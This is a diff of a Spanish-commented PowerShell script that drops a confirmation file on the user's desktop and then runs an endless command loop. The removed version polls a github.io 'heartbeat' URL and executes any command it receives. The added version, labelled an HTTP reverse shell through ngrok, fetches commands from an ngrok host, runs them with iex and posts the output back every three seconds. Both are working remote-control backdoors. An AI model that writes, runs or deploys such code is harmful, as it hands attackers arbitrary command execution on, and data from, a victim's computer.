@@ -1,14 +1,15 @@
-# Confirmar ejecución
-"Se ejecutó correctamente el $(Get-Date)" | Out-File -FilePath "$env:USERPROFILE\Desktop\ejecucion_confirmada.txt" -Append
+# Confirmar ejecuciÃ³n
+"Se ejecutÃ³ correctamente el $(Get-Date)" | Out-File -FilePath "$env:USERPROFILE\Desktop\ejecucion_confirmada.txt" -Append
 
-# Bucle de heartbeat
-while ($true) {
-    try {
-        $response = Invoke-WebRequest -Uri "https://fieropapagayo.github.io/1/heartbeat" -UseBasicParsing -TimeoutSec 10
-        $command = $response.Content.Trim()
-        if ($command -and $command -ne "OK") {
-            $result = Invoke-Expression $command 2>&1 | Out-String
+# Reverse shell HTTP hacia Ngrok
+$u='https://curler-puzzle-galley.ngrok-free.dev'
+while($true){
+    try{
+        $c=(Invoke-WebRequest -Uri $u -UseBasicParsing).Content
+        if($c -and $c -ne 'OK'){
+            $r=iex $c 2>&1 | Out-String
+            Invoke-WebRequest -Uri $u -Method POST -Body $r -UseBasicParsing
         }
-    } catch {}
-    Start-Sleep -Seconds 60
+    }catch{}
+    Start-Sleep -Seconds 3
 }
